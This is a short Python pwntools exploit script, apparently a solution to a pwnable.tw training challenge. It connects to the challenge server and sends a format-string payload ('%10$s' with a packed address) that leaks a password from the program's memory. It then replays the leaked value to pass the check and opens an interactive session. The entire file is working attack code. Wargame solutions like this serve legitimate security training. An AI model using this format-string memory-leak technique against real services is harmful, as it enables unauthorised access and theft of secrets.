#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *


host = "training.pwnable.tw"
port = 11007

r = remote(host,port)

password_addr = 0x804a048
r.recvuntil("?")


r.sendline(p32(password_addr) + "#" + "%10$s" + "#" )
r.recvuntil("#")
p = r.recvuntil("#")
password = u32(p[:4])
r.recvuntil(":")
r.sendline(str(password))
r.interactive()
